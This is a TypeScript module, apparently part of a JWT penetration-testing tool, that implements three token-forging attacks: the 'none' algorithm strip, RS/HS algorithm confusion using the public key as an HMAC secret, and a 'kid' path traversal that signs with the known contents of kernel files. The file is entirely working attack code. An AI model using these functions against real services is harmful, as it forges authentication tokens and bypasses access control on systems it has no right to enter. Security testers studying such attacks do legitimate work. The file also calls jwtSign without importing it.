import { getJwtParts, encodeJwtPart } from "./jwt";
import { EKidPayload } from "~/commons/enums/kid-payloads-enum";
import { NoneAttackEnum } from "~/commons/enums/none-attack-enum";
import { EAlgorithms } from "~/commons/enums/algorithms-enum";

export function noneAttack(token: string, algorithm: NoneAttackEnum) {
    const algorithms = {
        [NoneAttackEnum.NONE]: 'none',
        [NoneAttackEnum.EMPTY]: '',
        [NoneAttackEnum.FALSE]: false,
        [NoneAttackEnum.NULL]: null,
    };

    let [header, payload] = getJwtParts(token);
    header.alg = algorithms[algorithm];
    
    header = encodeJwtPart(header);
    payload = encodeJwtPart(payload);

    return `${header}.${payload}.`;
}

export async function algorithmConfusion(token: string, publicKey: string, symmetricAlg: EAlgorithms = EAlgorithms.HS256) {
    let [header, payload] = getJwtParts(token);

    header.alg = symmetricAlg;
    
    return await jwtSign({
        header,
        payload,
        alg: symmetricAlg,
        secretKey: publicKey,
    });
}

export async function kidPathTraversal(token: string, signaturePayload: EKidPayload) {
    let [header, payload] = getJwtParts(token);

    header.kid = signaturePayload;

    const signatures = {
        [EKidPayload.TIMER_MIGRATION]: 1,
        [EKidPayload.RANDOMIZE_VA_SPACE]: 2
    }

    return await jwtSign({
        header,
        payload,
        secretKey: signatures[signaturePayload].toString()
    });
}